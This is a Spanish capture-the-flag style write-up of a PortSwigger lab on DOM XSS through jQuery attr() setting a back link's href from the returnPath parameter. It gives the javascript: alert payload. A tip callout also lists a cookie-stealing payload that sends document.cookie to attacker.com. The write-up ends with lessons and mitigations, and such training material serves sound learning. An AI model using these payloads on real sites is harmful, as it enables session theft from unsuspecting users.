---
title: "DOM XSS in jQuery anchor href attribute sink using location.search source"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source"
author: "Z4k7"
date: "2026-04-15"
year: "2026"
status: "pwned"
tags:
  - "DOM"
  - "BurpSuite_Academy"
  - "backLink"
techniques:
  - "DOM XSS"
  - "source location.search"
  - "sink setAttribute"
tools:
  - "browser"
  - "jQuery"
  - "JavaScript"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de BurpSuite Academy: vulnerabilidad DOM XSS en página de envío de comentarios. Utiliza jQuery para manipular atributo href usando datos no validados de location.search. Técnica: inyección de protocolo javascript: en parámetro URL. Cadena de ataque: source location.search → sink attr() → ejecución JavaScript.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la página de envío de comentarios. Utiliza la biblioteca jQuery. `$` función de selección para encontrar un elemento de anclaje y cambia su `href` atributo utilizando datos de `location.search`.
          Para resolver este laboratorio, haga que el enlace "atrás" genere una alerta. `document.cookie`.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/file-20260415111540975.jpg"
        caption: "Acceso inicial al lab"
      - kind: "note"
        text: |
          Validamos los diferentes apartados y comportamientos. En este caso como estamos validando jQuery el único apartado que cuenta con código es `Submit feedback` consultando el código fuente validamos el siguiente código:
      - kind: "code"
        lang: "JS"
        code: |
          <script>
              $(function() {
                  $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
              });
          </script>
      - kind: "note"
        text: |
          Lo anterior valida la url actual y extrae el apartado `returnPath` una vez ya contamos con la dicho apartado. El código toma el valor del parámetro `returnPath` de la URL y lo coloca como el `href` del enlace con id `backLink`.
      - kind: "bullet"
        text: "Source identificada: location.search (parámetro returnPath)"
      - kind: "bullet"
        text: "Sink identificado: jQuery attr() modificando atributo HTML"
      - kind: "bullet"
        text: "No hay validación o sanitización"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En DOM XSS, la clave es identificar: (1) dónde viene el dato (source), (2) dónde se usa (sink), (3) si hay validación en medio. Aquí: source→sink directamente, sin validación. jQuery `attr()` NO sanitiza."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Submit feedback` contamos con la siguiente interfaz:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/file-20260415115934584.jpg"
        caption: "Acceso inicial al lab"
      - kind: "note"
        text: |
          El único apartado relevante es `backLink` es el encargado de aplicar el comportamiento de jQuery
      - kind: "code"
        lang: "JS"
        code: |
          <script>
              $(function() {
                  $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
              });
          </script>
      - kind: "note"
        text: |
          Si consultamos la URL:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/file-20260415120210426.jpg"
        caption: "Acceso inicial al lab"
      - kind: "callout"
        type: "warning"
        label: "Parámetro sin validación"
        text: "El parámetro `returnPath` se extrae directamente de la URL sin ningún tipo de validación. Permite cualquier valor, incluyendo `javascript:`."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Cuando veas `URLSearchParams().get()` + `attr()` juntos, sospecha DOM XSS. Esta es una pareja peligrosa: extrae sin filtrar, asigna sin sanitizar."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Si manipulamos la URL con el siguiente código `javascript:alert(document.domain)` nos permite ejecutar el javascript una vez el usuario de click en `backLink`:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/file-20260415120423073.jpg"
        caption: "Acceso inicial al lab"
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/file-20260415120502453.jpg"
        caption: "Acceso inicial al lab"
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/file-20260415120441560.jpg"
        caption: "Acceso inicial al lab"
      - kind: "code"
        lang: "BASH"
        code: |
          URL: ?returnPath=javascript:alert(document.cookie)
      - kind: "callout"
        type: "info"
        label: "Mecanismo de ejecución"
        text: "Navegador interpreta `href='javascript:alert()'` como protocolo ejecutable. Al hacer clic, ejecuta el código. No requiere `onclick` ni otros eventos — el protocolo `javascript:` es suficiente."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Alternativas de explotación del mismo sink: - `javascript:fetch('/admin')` — hacer requests al backend - `javascript:document.location='http://attacker.com/?cookie='+document.cookie` — robar cookies - `javascript:void(0)` — bloquear navegación (para otros sinks) Todas funcionan porque jQuery no valida el atributo `href`."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          La explotación en este laboratorio es simultáneamente el acceso inicial. Una vez que manipulas la URL con el payload, haces clic en el enlace y ejecutas JavaScript en el contexto de la página.
          No hay "acceso inicial" adicional — la vulnerabilidad permite ejecución arbitraria de JavaScript directamente.

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este laboratorio no aplica escalada de privilegios — es una vulnerabilidad de ejecución de código en el navegador (client-side), no en el servidor.
          La "escalada" en este contexto sería: JavaScript ejecutado → acceso a cookies/sessionStorage → potencial robo de sesión de usuario.

lessons:
  - 'jQuery `attr()` es un sink peligroso si recibe datos no validados'
  - '`location.search` es un source no confiable siempre — nunca usar directamente en sinks'
  - 'El protocolo `javascript:` en atributos HTML es ejecutable sin validación adicional'
  - 'DOM XSS ocurre en el navegador (client-side), no en el servidor'
  - 'La ausencia de validación + presencia de sink = vulnerabilidad garantizada'
mitigation:
  - 'Validar que `returnPath` sea una URL relativa segura (comienza con `/` y no contiene protocolo)'
  - 'Usar whitelist de URLs permitidas para redirección'
  - 'Implementar Content Security Policy (CSP) para bloquear `javascript:` protocol'
  - 'En lugar de `attr()`, usar métodos más seguros como event listeners + validación explícita'
---
